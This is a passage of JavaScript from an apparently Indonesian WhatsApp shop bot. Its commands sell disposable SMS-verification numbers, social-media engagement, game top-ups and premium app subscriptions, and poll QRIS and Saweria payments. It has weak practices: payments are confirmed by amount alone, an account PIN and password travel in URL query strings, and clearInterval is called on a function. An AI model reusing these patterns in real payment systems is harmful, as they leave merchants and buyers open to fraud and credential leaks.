            viewOnce: true,
            image: { url: pembayaran.qrImageUrl },
            caption: teks3,
            contextInfo: { mentionedJid: [m.sender] },
        });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: pembayaran.transactionId,
            amount: pembayaran.amount.toString(),
            service: serviceId
        };

        // TIMER EXPIRED (TIDAK DISIMPAN DI DATABASE)
        let timeout = setTimeout(async () => {
            if (db.users[m.sender].status_deposit) {
                await gisnaxd.sendMessage(m.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: msgQr });
                await gisnaxd.sendMessage(m.chat, { delete: msgQr.key });
                db.users[m.sender].status_deposit = false;
                delete db.users[m.sender].saweria;
            }
        }, 300000);

        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
            const req = resultcek.data;

            if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;
                clearTimeout(timeout);

                await gisnaxd.sendMessage(m.chat, { text: `
✅ *PEMBAYARAN BERHASIL DITERIMA*

🆔 *ID :* ${db.users[m.sender].saweria.idDeposit}
💰 *Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
📦 *Barang :* ${layanan.nama}
`}, { quoted: msgQr });
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);

                // **🛒 Proses Pemesanan ke VirtuSIM**
                let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=order&service=${serviceId}&operator=any`;
                let response = await fetch(apiUrl);
                let result = await response.json();

                console.log("🔥 Debug API Response:", result); // Tambahkan ini untuk melihat respons di console log

                if (!result || !result.status || !result.data) {
                    return Reply("❌ Gagal melakukan pemesanan. Coba lagi nanti.");
                }

                let message = `✅ *Order Berhasil!*\n\n`;
                message += `🆔 *ID Order:* ${result.data.id}\n`;
                message += `📌 *Layanan:* ${result.data.service_name}\n`;
                message += `📞 *Nomor:* ${result.data.number}\n`;
                message += `⏳ *Status:* Ready`;

                await gisnaxd.sendMessage(m.chat, { text: message }, { quoted: msgQr });

                // **Hapus Data Transaksi Setelah Selesai**
                await gisnaxd.sendMessage(m.chat, { delete: msgQr.key });
                delete db.users[m.sender].saweria;
            }
        }
    } catch (error) {
        console.error("❌ Error dalam case ordernokos:", error.message);
        Reply("❌ Terjadi kesalahan dalam proses permintaan.");
    }
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ubahstatus": {
 try {
 if (!args[0] || !args[1]) {
 Reply("❌ Format salah!\nGunakan: *ubahstatus IDORDER STATUS*\n\n📌 *Status yang tersedia:*\n1 - Ready ✅\n2 - Cancel ❌\n3 - Resend 🔄\n4 - Selesai 🎉");
 break;
 }

 let orderId = args[0]; 
 let status = args[1]; 

 if (!["1", "2", "3", "4"].includes(status)) {
 Reply("❌ Status tidak valid! Gunakan:\n1 - Ready ✅\n2 - Cancel ❌\n3 - Resend 🔄\n4 - Selesai 🎉");
 break;
 }

 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=set_status&id=${orderId}&status=${status}`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status) {
 Reply(`❌ Gagal mengubah status order *${orderId}*. Coba lagi nanti.`);
 break;
 }

 let statusText = 
 status === "1" ? "✅ Ready" :
 status === "2" ? "❌ Cancel" :
 status === "3" ? "🔄 Resend" :
 "🎉 Selesai";

 Reply(`✅ *Status Order Berhasil Diubah!*\n\n🆔 ID Order: ${orderId}\n📌 Status Baru: ${statusText}`);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengubah status order.");
 }
}
 break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "statussms": {
 try {
 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=active_order`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status || !result.data || result.data.length === 0) {
 Reply("❌ Tidak ada SMS yang tersedia saat ini.");
 break;
 }

 let message = "📩 *Daftar SMS Aktif*\n\n";
 result.data.forEach((order, index) => {
 message += `*${index + 1}. ${order.service}*\n`;
 message += `📞 Nomor: ${order.number}\n`;
 message += `📩 Kode SMS: ${order.sms || "Belum diterima"}\n`;
 message += `🆔 ID Order: ${order.id}\n\n`;
 });

 Reply(message);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengambil status SMS.");
 }
}
 break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekpesanan": {
 try {
 if (!args[0]) {
 Reply("❌ Format salah!\nGunakan: *cekpesanan IDORDER*");
 break;
 }

 let orderId = args[0]; 
 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=status&id=${orderId}`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status || !result.data) {
 Reply(`❌ Order dengan ID *${orderId}* tidak ditemukan.`);
 break;
 }

 let order = result.data;
 let statusText = 
 order.status === "1" ? "✅ Ready" :
 order.status === "2" ? "❌ Canceled" :
 order.status === "3" ? "🔄 Resend" :
 order.status === "4" ? "🎉 Selesai" :
 "⏳ Pending";

 let message = `📦 *Status Pesanan*\n\n`;
 message += `🆔 ID Order: ${order.id}\n`;
 message += `📞 Nomor: ${order.number || "Belum tersedia"}\n`;
 message += `📌 Layanan: ${order.service}\n`;
 message += `📩 Kode SMS: ${order.sms || "Belum diterima"}\n`;
 message += `⏳ Status: ${statusText}`;

 Reply(message);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengecek pesanan.");
 }
}
 break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ceksaldo-orkut":
{
if (!isCreator) return Reply('Khusus own');
const url = `https://h2h.okegisnaxdect.com/trx/balance?memberID=${global.merchantIdOrderKuota}&pin=${global.pinOrkut}&password=${global.pwOrkut}`
const res = await fetchJson(url);
const ror = `
Berikut Adalah Saldo Orkut Anda ❗

 *ァ Merchant :* ${global.merchantIdOrderKuota}
 *ァ Balance :* ${res}
`
Reply(ror)
}

break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ceksaldosmm": {
 try {
 const apiEndpoint = "https://smmnusantara.id/api/balance"; 
 const apiID = global.apiID; 
 const apiKey = global.apiKey; 

 const axios = require('axios'); 
 axios
 .post(apiEndpoint, {
 api_id: apiID,
 api_key: apiKey,
 })
 .then((response) => {
 const data = response.data;

 if (data && data.balance !== undefined) {
 Reply(`✅ Saldo SMM Anda saat ini adalah: Rp${data.balance}`);
 } else {
 Reply("❌ Gagal memeriksa saldo. Silakan coba lagi.");
 }
 })
 .catch((error) => {
 console.error(error);
 Reply("❌ Terjadi kesalahan saat memeriksa saldo.");
 });
 } catch (error) {
 console.error(error);
 Reply("❌ Terjadi kesalahan dalam proses permintaan.");
 }
 }
 break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "daftarlayanan":
{
  try {
    let servicesData = await services();
    console.log("Respons API:", servicesData);

    let layananArray = [];
    if (servicesData && typeof servicesData === 'object') {
      layananArray = servicesData.data || servicesData.services || [];
    }

    if (Array.isArray(layananArray) && layananArray.length > 0) {
      let inputArgs = text.split("|"); 
      let linkTarget = inputArgs[0]?.trim() || "Belum diisi";
      let jumlah = inputArgs[1]?.trim() || "Belum diisi";

      let teksnya = `
📌 *Detail Order Anda:*
🔗 *Link Target / Username:* ${linkTarget}
🔢 *Jumlah:* ${jumlah}

📋 *Pilih kategori layanan yang tersedia:*
      `;

      // Mengelompokkan layanan berdasarkan kategori
      let kategoriLayanan = {};
      layananArray.forEach(service => {
        let kategori = service.category || "Lainnya";
        if (!kategoriLayanan[kategori]) {
          kategoriLayanan[kategori] = [];
        }
        kategoriLayanan[kategori].push({
          title: `${service.name} - Rp${service.price}/1000`,
          description: `Min: ${service.min}, Max: ${service.max}`,
          id: `.order ${service.id}|${linkTarget}|${jumlah}`
        });
      });

      // Membuat tombol kategori utama
      let kategoriButtons = Object.keys(kategoriLayanan).map(kategori => ({
        quickReplyButton: {
          displayText: `📌 ${kategori}`,
          id: `.kategori ${kategori}|${linkTarget}|${jumlah}`
        }
      }));

      await gisnaxd.sendMessage(m.chat, {
        text: teksnya,
        footer: ` ${botname}`,
        templateButtons: kategoriButtons,
        headerType: 1,
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `${botname}`,
            body: `♨️ ${runtime(process.uptime())}`,
            mediaType: 1,
            thumbnailUrl: global.image.small_menu, 
            sourceUrl: linkSaluran,
            renderLargerThumbnail: false 
          }
        }
      });

      // Menyimpan kategori ke dalam cache (opsional)
      global.kategoriLayananCache = kategoriLayanan;

    } else {
      console.error("Data tidak valid:", layananArray);
      Reply("❌ Tidak ada layanan yang ditemukan atau respons tidak valid.");
    }
  } catch (error) {
    console.error("Error dalam case:", error.message); 
    Reply("❌ Terjadi kesalahan dalam proses permintaan.");
  }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~//
case "kategori":
{
  try {
    let inputArgs = text.split("|");
    let kategoriDipilih = inputArgs[0]?.trim() || null;
    let linkTarget = inputArgs[1]?.trim() || "Belum diisi";
    let jumlah = inputArgs[2]?.trim() || "Belum diisi";

    if (!kategoriDipilih || !global.kategoriLayananCache[kategoriDipilih]) {
      return Reply("❌ Kategori tidak ditemukan atau tidak tersedia.");
    }

    let layananDalamKategori = global.kategoriLayananCache[kategoriDipilih];

    let teksKategori = `📌 *Layanan dalam kategori ${kategoriDipilih}:*\n`;
    let buttons = layananDalamKategori.slice(0, 10).map(service => ({
      quickReplyButton: {
        displayText: `${service.title}`,
        id: service.id
      }
    }));

    await gisnaxd.sendMessage(m.chat, {
      text: teksKategori,
      footer: ` ${botname}`,
      templateButtons: buttons,
      headerType: 1,
      contextInfo: {
        mentionedJid: [m.sender]
      }
    });

  } catch (error) {
    console.error("Error dalam case kategori:", error.message); 
    Reply("❌ Terjadi kesalahan dalam menampilkan layanan.");
  }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "order": {
    try {
        if (m.isGroup) return Reply("Pembelian hanya bisa dilakukan di private chat!");
        if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

        const input = text.split('|');
        if (input.length !== 3) {
            return Reply("❌ Format salah! Gunakan format: *.order IDLAYANAN|TARGET|JUMLAH*");
        }

        const idLayanan = input[0].trim();
        const target = input[1].trim();
        const jumlah = parseInt(input[2].trim());
        if (isNaN(jumlah) || jumlah <= 0) {
            return Reply("❌ Jumlah harus berupa angka positif.");
        }

        // Hitung harga
        const hargaPerItem = 100; // Ganti dengan harga per layanan
        const totalHarga = hargaPerItem * jumlah;
        const amount = Number(totalHarga) + generateRandomNumber(110, 250);

        const UrlQr = global.qrisOrderKuota;
 const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);

 const teks3 = `
*乂 INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Layanan SMM
 *• Expired :* 5 menit

*Note :* 
QRIS hanya berlaku dalam 5 menit. Jika pembayaran berhasil, pesanan akan otomatis diproses.

Ketik *.batalbeli* untuk membatalkan
`;

 let msgQr = await gisnaxd.sendMessage(m.chat, {
 footer: ` ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: { url: get.data.result.qrImageUrl },
 caption: teks3,
 contextInfo: { mentionedJid: [m.sender] },
 });

 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 service: idLayanan,
 target: target,
 quantity: jumlah,
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit) {
 await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000);
 }
 };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);

 await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Layanan SMM
`}, { quoted: db.users[m.sender].saweria.msg });
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);

 // Proses Pemesanan ke SMM Nusantara
 const apiEndpoint = "https://smmnusantara.id/api/order";
 const postData = {
 api_id: global.apiID,
 api_key: global.apiKey,
 service: db.users[m.sender].saweria.service,
 target: db.users[m.sender].saweria.target,
 quantity: db.users[m.sender].saweria.quantity,
 };

 axios.post(apiEndpoint, postData)
 .then(async (response) => {
 const result = response.data;
 if (result.error) {
 Reply(`❌ Gagal membuat pesanan. Pesan: ${result.error}`);
 } else {
 await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { text: `
✅ *Pesanan Berhasil Dibuat!*

 *• ID Layanan:* ${db.users[m.sender].saweria.service}
 *• Target:* ${db.users[m.sender].saweria.target}
 *• Jumlah:* ${db.users[m.sender].saweria.quantity}
 *• Order ID:* ${result.order}
`}, { quoted: db.users[m.sender].saweria.msg });
 }
 })
 .catch((error) => {
 console.error("Error saat memesan layanan:", error.message);
 Reply("❌ Terjadi kesalahan saat memproses pesanan.");
 });

 // Hapus data transaksi
 await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error("Error dalam case:", error.message);
 Reply("❌ Terjadi kesalahan dalam proses permintaan.");
 }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//Fitur VIP-Reseller

case "informasi-akun": {
try {
 const apild = global.vipa_api_id;
 const apiKey = global.vipa_api_key;
 const signFormula = md5(apild + apiKey);

 let form = new FormData();
 form.append('key', apiKey);
 form.append('sign', signFormula);

 const response = await fetch(global.vipa_url + '/api/profile', {
method: 'POST',
headers: {
 'Accept': 'application/json',
 ...form.getHeaders()
},
body: form
 });

 const responseData = await response.json();
 if (response.ok && responseData.result) {
const accountDetails = responseData.data;
const reply = `ℹ️ *INFO AKUN VIPAYMENT*

- Nama: ${accountDetails.full_name}
- Username: ${accountDetails.username}
- Saldo: Rp. ${Func.formatNumber(accountDetails.balance)} 
- Poin: ${Func.formatNumber(accountDetails.point)} 
- Level: ${accountDetails.level} 
- Terdaftar: ${accountDetails.registered}

${global.footer}`;
m.reply(reply);
 } else {
const errorMessage = responseData.message || 'Gagal mendapatkan detail akun';
return m.reply(`🚩 ${errorMessage}`);
 }
} catch (e) {
 return m.reply(Func.jsonFormat(e));
}
 }
break
case "orderapk": {
 try {
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');
const FormData = require('form-data');
const md5 = require('md5');

const Riwayat_game = path.join(__dirname, 'source/database/game_riwayat.json');

// Check for existing payment process
if (fs.existsSync(`./source/gateway/${m.sender.split("@")[0]}.json`)) {
 return await gisnaxd.sendMessage(m.chat, {
text: `⚠️ Proses pembelian sebelumnya belum selesai!\n\nKetik ${prefix}batalbeli untuk membatalkan.`
 });
}

// Validasi konfigurasi API
if (!global.vipa_api_id || !global.vipa_api_key || !global.vipa_url) {
 return m.reply('❌ Konfigurasi API tidak lengkap');
}

// Validasi argumen
if (args.length < 2) {
 return m.reply('🚩 Format salah!\nGunakan: .ordergame [kode_layanan] [id/email] [zone]\nContoh:\n1. Game: .ordergame ML123 12345678 1234\n2. Email: .ordergame YTPREM email@gmail.com');
}

const kodeLayanan = args[0].toUpperCase();
const dataNo = args[1];
const dataZone = args[2] || '';

// Get price from API first
const apild = global.vipa_api_id;
const apiKey = global.vipa_api_key;
const signFormula = md5(apild + apiKey);

const formOrder = new FormData();
formOrder.append('key', apiKey);
formOrder.append('sign', signFormula);
formOrder.append('type', 'order');
formOrder.append('service', kodeLayanan);
formOrder.append('data_no', dataNo);
if (dataZone) formOrder.append('data_zone', dataZone);

const resOrder = await fetch(`${global.vipa_url}/api/game-feature`, {
 method: 'POST',
 headers: { 
'Accept': 'application/json', 
...formOrder.getHeaders() 
 },
 body: formOrder
});

const orderData = await resOrder.json();

if (!orderData.result) {
 return m.reply(`❌ Gagal melakukan pemesanan: ${orderData.message || "Tidak diketahui"}`);
}

const order = orderData.data;
const amount = order.price + 3000;

// Initialize Saweria payment
const Pay = new Saweria(db_saweria);
const expirationTime = new Date(Date.now() + 10 * 60 * 1000);

let res;
try {
 res = await Pay.createPayment(amount, `Top Up ${order.service}`, {
expired_at: expirationTime.toISOString()
 });
} catch (error) {
 return await gisnaxd.sendMessage(m.chat, {
text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${error.message}`
 });
}

if (!res.status) {
 return await gisnaxd.sendMessage(m.chat, {
text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${res.msg}`
 });
}

// Save payment info
fs.writeFileSync(
 `./source/gateway/${m.sender.split("@")[0]}.json`,
 JSON.stringify({
number: m.sender,
id: res.data.id,
expiredAt: expirationTime.toISOString(),
orderDetails: {
 trxid: order.trxid,
 service: order.service,
 data_no: dataNo,
 data_zone: dataZone || '-'
}
 }, null, 3)
);

// Send payment info
const teks = `
📄 *INFO PEMBAYARAN TOP UP*
🎮 *Layanan*: ${order.service}
👤 *ID Game*: ${dataNo}${dataZone ? `\n🌍 *Zone*: ${dataZone}` : ''}
💰 *Total Pembayaran*: Rp ${amount.toLocaleString("id-ID")}
📆 *Batas Waktu*: ${expirationTime.toLocaleString("id-ID", {
 timeZone: "Asia/Jakarta"
})} WIB
🆔 *ID Pembayaran*: ${res.data.id}
📌 *Catatan*: 
1️⃣ QR berlaku hanya untuk 1 kali transfer.
2️⃣ QR akan kedaluwarsa dalam 10 menit.
3️⃣ Setelah transfer, tunggu beberapa saat hingga status diperbarui otomatis.
🛑 Jika ingin membatalkan, ketik *${prefix}batalbeli*.
📞 Untuk bantuan, hubungi *${prefix}owner*.
`;

await gisnaxd.sendMessage(m.chat, {
 image: Buffer.from(res.data.qr_image.split(",")[1], "base64"),
 caption: teks
}, { quoted: m });

// Payment monitoring
let status = false;
const maxAttempts = 600;
let attempts = 0;

while (!status && attempts < maxAttempts) {
 await sleep(1000);
 attempts++;

 if (new Date() > expirationTime) {
fs.unlinkSync(`./source/gateway/${m.sender.split("@")[0]}.json`);
return await gisnaxd.sendMessage(m.chat, {
 text: `❌ Waktu pembayaran habis.\nSilakan coba lagi.`
});
 }

 let check = await Pay.checkPayment(res.data.id);
 status = check.status;

 if (status) {
// Payment successful, proceed with order processing
const paymentInfo = JSON.parse(fs.readFileSync(`./source/gateway/${m.sender.split("@")[0]}.json`, 'utf8'));
fs.unlinkSync(`./source/gateway/${m.sender.split("@")[0]}.json`);

await gisnaxd.sendMessage(m.chat, {
 text: `✅ *Pembayaran Berhasil!*\nMemproses pesanan...`
});
const now = new Date();
const transaksi = {
transactionId: `${m.sender}_${Date.now()}`,
sender: m.sender,
amount: order.price,
hadiah: `Beli Akun Permium ${order.service}`,
metode: "Saweria",
tanggal: now.toLocaleDateString('id-ID'),
waktu: now.toLocaleTimeString('id-ID'),
status: "selesai"
};

const transaksiPath = './source/transaksi.json';
let transaksiData = [];
if (fs.existsSync(transaksiPath)) {
transaksiData = JSON.parse(fs.readFileSync(transaksiPath, 'utf8'));
}

transaksiData.push(transaksi);
fs.writeFileSync(transaksiPath, JSON.stringify(transaksiData, null, 2), 'utf8');
// Save to transaction history
let riwayatTransaksi = [];
if (fs.existsSync(Riwayat_game)) {
 riwayatTransaksi = JSON.parse(fs.readFileSync(Riwayat_game, 'utf8'));
}

const transaksiBaru = {
 trxid: order.trxid,
 layanan: order.service,
 data_no: dataNo,
 data_zone: dataZone || '-',
 harga: amount,
 status: 'PENDING',
 waktu: new Date().toISOString()
};

riwayatTransaksi.push(transaksiBaru);
fs.writeFileSync(Riwayat_game, JSON.stringify(riwayatTransaksi, null, 2));

// Start monitoring order status
cekStatusBerkala(order.trxid);
 // Kirim balasan order
 let reply = `╔══『 PEMESANAN BERHASIL 』══╗
║ 
╠ 📋 *Detail Pesanan*
║ ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
╠ 🏷️ *ID:* ${order.trxid}
╠ 📌 *Layanan:* ${order.service}
╠ 🎮 *Data:* ${dataNo}
${dataZone ? `╠ 🌍 *Zone:* ${dataZone}\n` : ''}╠ 💰 *Harga:* ${formatPrice(order.price)}
╠ 📦 *Status:* ⏳ PENDING
║
╠ 📜 *Tutorial Cek Status:*
╠ Ketik: .cekstatustrx ${order.trxid}
║
╚═══════════════════╝
${global.footer}`;

 m.reply(reply);
}}
} catch (error) {
console.error('Error in order:', error);
m.reply(`🚩 Terjadi kesalahan: ${error.message}`);
}
break;
}
case "layananapk": {
  // Daftar layanan digital
  const digitalServices = [
    "Alight Motion",
    "Amazon Prime", 
    "Bstation Premium", 
    "Canva Pro", 
    "Disney Hotstar", 
    "Getcontact Premium", 
    "iQIYI Premium", 
    "Vidio Premier Vision Plus", 
    "Viu Premium", 
    "WeTV Premium", 
    "Youtube Premium"
  ];

  const title = `┏━━━〔 💳 *BOT SHOP* 〕━━━┓  
🤸 *Tingkatkan Pengalaman Digital Anda!* 🤸  
🫡 Layanan Premium dengan Harga Terbaik & Terpercaya  
💌 Diskon Spesial Setiap Hari! 💌  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  

🔽 *Pilih Layanan Favorit Anda & Nikmati Keuntungannya!* 🔽  
`;

  // Menyiapkan rows untuk list
  const serviceRows = digitalServices.map((service, index) => {
    return {
      title: `${index + 1}. ${service}`,
      description: `🔍 Dapatkan akses premium ${service} sekarang!`,
      id: `.cekhargaapk ${service}`
    };
  });

  const buttonData = {
    title: "📱 *Daftar Layanan Premium*",
    sections: [{
      title: "🌟 *Pilihan Layanan*",
      rows: serviceRows
    }]
  };

  const footer = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *BOTSHOP - Semua kebutuhan digital Anda!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  // Mengirim pesan dengan format list
  await gisnaxd.sendList(m.chat, title, footer, buttonData, { quoted: m });
  
  break;
}
case "cekhargaapk": {
  try {
    // Pastikan konfigurasi API lengkap
    if (!global.vipa_api_id || !global.vipa_api_key || !global.vipa_url) {
      throw new Error("Konfigurasi API tidak lengkap. Harap periksa pengaturan.");
    }

    // Konfigurasi API
    const apiId = global.vipa_api_id;
    const apiKey = global.vipa_api_key;
    const signature = md5(apiId + apiKey);

    // Siapkan data permintaan
    const form = new FormData();
    form.append("key", apiKey);
    form.append("sign", signature);
    form.append("type", "services");

    const keyword = args.join(" ").toLowerCase(); // Kata kunci pencarian

    // Kirim permintaan ke API
    const response = await fetch(`${global.vipa_url}/api/game-feature`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        ...form.getHeaders(),
      },
      body: form,
    });

    const responseData = await response.json();

    // Validasi respons API
    if (!response.ok || !responseData.result) {
      throw new Error(responseData.message || "Gagal mendapatkan daftar layanan.");
    }

    let services = responseData.data;

    if (!Array.isArray(services) || services.length === 0) {
      throw new Error("Data layanan tidak valid atau kosong.");
    }

    // Filter layanan berdasarkan ketersediaan dan kata kunci
    services = services.filter(service => 
      service.status === "available" &&
      (!keyword || 
        service.name.toLowerCase().includes(keyword) || 
        service.game.toLowerCase().includes(keyword))
    );

    if (services.length === 0) {
      return m.reply(`🚩 Tidak ada layanan yang cocok dengan pencarian *"${keyword}"*.`);
    }

    // Format pesan title
    const title = `🔍 Berikut daftar layanan game yang tersedia${keyword ? ` untuk pencarian *"${keyword}"*` : ""}:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *Top Up Game - Solusi Tepat untuk Kebutuhan Gaming Anda!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    // Menyiapkan data untuk button
    const buttonData = {
      title: "🎮 *DAFTAR LAYANAN GAME*",
      sections: [{
        title: "🎮 *DAFTAR LAYANAN GAME*",
        rows: services.map((service, index) => ({
          title: `${index + 1}. ${service.name}`,
          description: `🎮 *Game:* ${service.game}\n💰 *Harga:* Rp${Func.formatNumber(service.price.basic + 3000)} (Basic) | Rp${Func.formatNumber(service.price.premium + 3000)} (Premium) | Rp${Func.formatNumber(service.price.special + 3000)} (Special)\n🖥️ *Server:* ${service.server}`,
          id: `.cekapk ${service.code}`
        }))
      }]
    };

    const footer = global.footer;

    // Mengirim pesan dengan format list
    await gisnaxd.sendList(m.chat, title, footer, buttonData, { quoted: m });

  } catch (error) {
    console.error("Error dalam layanan game:", error);
    m.reply(`🚩 Terjadi kesalahan: ${error.message}`);
  }
  break;
}
case "cekapk": {
 try {
if (!global.vipa_api_id || !global.vipa_api_key || !global.vipa_url) {
 throw new Error('Konfigurasi API tidak lengkap');
}

if (!args[0]) {
 return m.reply('🚩 Mohon berikan kode layanan! Contoh: .cekdetailgame ML001');
}

const apild = global.vipa_api_id;
const apiKey = global.vipa_api_key;
const signFormula = md5(apild + apiKey);
const kodeLayanan = args[0].toUpperCase(); // Ambil kode layanan dari input user

let form = new FormData();
form.append('key', apiKey);
form.append('sign', signFormula);
form.append('type', 'services');

const response = await fetch(`${global.vipa_url}/api/game-feature`, {
 method: 'POST',
 headers: {
'Accept': 'application/json',
...form.getHeaders()
 },
 body: form
});

const responseData = await response.json();

if (!response.ok || !responseData.result) {
 throw new Error(responseData.message || 'Gagal mendapatkan daftar layanan');
}

let services = responseData.data;

if (!services || !Array.isArray(services)) {
 throw new Error('Data layanan tidak valid');
}

// Cari layanan berdasarkan kode yang diberikan
const service = services.find(s => s.code.toUpperCase() === kodeLayanan);

if (!service) {
 return m.reply(`🚩 Layanan dengan kode *"${kodeLayanan}"* tidak ditemukan.`);
}

// Format detail layanan
let reply =`*Detail Produk*\n\n`;
reply += `*○ Brand:* ${service.name}\n`;
reply += `*○ Code Produk:* ${service.code}\n`;
reply += `*○ Name:* ${service.game}\n`;
reply += `*○ Note:* ${service.description || "Tidak ada deskripsi"}\n`;
reply += `*○ Price :*\n> Basic: Rp. ${Func.formatNumber(service.price.basic + 3000)}\n> Premium: Rp. ${Func.formatNumber(service.price.premium + 3000)}\n> Special: ${Func.formatNumber(service.price.special + 3000)}\n`;
reply += `*○ Harga Untuk Anda :*\n> ${Func.formatNumber(service.price.basic + 3000)}\n`;
reply += `*○ Status:* ${service.status === 'available' ? '✅ Tersedia' : '❌ Kosong'}\n`;
reply += `*○ Multi Trx:* ${service.multi_trx ? 'Ya' : 'Tidak'}\n\n`;
reply += `🏷 Tutorial Beli : *.orderapk code email/nomor*\n`;
reply += `${global.footer}`;

await gisnaxd.sendMessage(m.chat, { caption: reply, image: { url: "https://img86.pixhost.to/images/496/563160310_yilzishop.jpg" },
});
 } catch (error) {
console.error('Error in cekdetailgame:', error);
m.reply(`🚩 Terjadi kesalahan: ${error.message}`);
 }
 break;
}
case "cekstatustrx": {
 try {
if (!global.vipa_api_id || !global.vipa_api_key || !global.vipa_url) {
 throw new Error('Konfigurasi API tidak lengkap');
}

const apild = global.vipa_api_id;
const apiKey = global.vipa_api_key;
const signFormula = md5(apild + apiKey);

let form = new FormData();
form.append('key', apiKey);
form.append('sign', signFormula);
form.append('type', 'status');

// Jika pengguna memberikan trxid, gunakan untuk filter transaksi
if (args[0]) {
 form.append('trxid', args[0]);
} else {
 form.append('limit', 5); // Jika tidak ada trxid, ambil 5 transaksi terakhir
}

const response = await fetch(`${global.vipa_url}/api/game-feature`, {
 method: 'POST',
 headers: {
'Accept': 'application/json',
...form.getHeaders()
 },
 body: form
});

const responseData = await response.json();

if (!response.ok || !responseData.result) {
 throw new Error(responseData.message || 'Gagal mendapatkan status pesanan');
}

let transactions = responseData.data;

if (!transactions || !Array.isArray(transactions) || transactions.length === 0) {
 return m.reply(`🚩 Tidak ditemukan transaksi dengan ID *"${args[0] || 'terbaru'}"*.`);
}

let reply = `📦 *DETAIL STATUS PESANAN*\n\n`;
transactions.forEach((trx, index) => {
  reply += `📝 *Pesanan ${index + 1}*\n`;
  reply += `🔹 *Layanan:* ${trx.service}\n`;
  reply += `🔹 *ID Transaksi:* ${trx.trxid}\n`;
